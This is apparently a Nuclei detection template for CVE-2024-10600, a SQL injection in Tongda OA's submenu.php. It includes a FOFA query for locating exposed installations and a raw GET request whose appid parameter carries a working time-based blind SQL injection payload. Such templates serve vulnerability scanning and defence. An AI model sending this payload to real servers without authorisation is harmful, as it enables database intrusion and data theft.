id: CVE-2024-10600

info:
  name: Tongda OA submenu.php - SQL Injection
  author: qwtd
  severity: critical
  description: |
    Tongda OA submenu.php contains a SQL injection vulnerability. An attacker can execute arbitrary SQL commands via the menu_id parameter.
    v2017-v11.6
  reference:
    - https://mp.weixin.qq.com/s/TL1QWIpSpnrqcJ4rTXTTdQ
    - https://github.com/LvZCh/td/issues
  metadata:
    fofa: app="TDXK-通达OA" && icon_hash="-759108386"
  tags: TDXK-通达OA

http:
  - raw:
      - |
        GET /pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3"
      - type: word
        words:
          - "<title>未登录</title>"
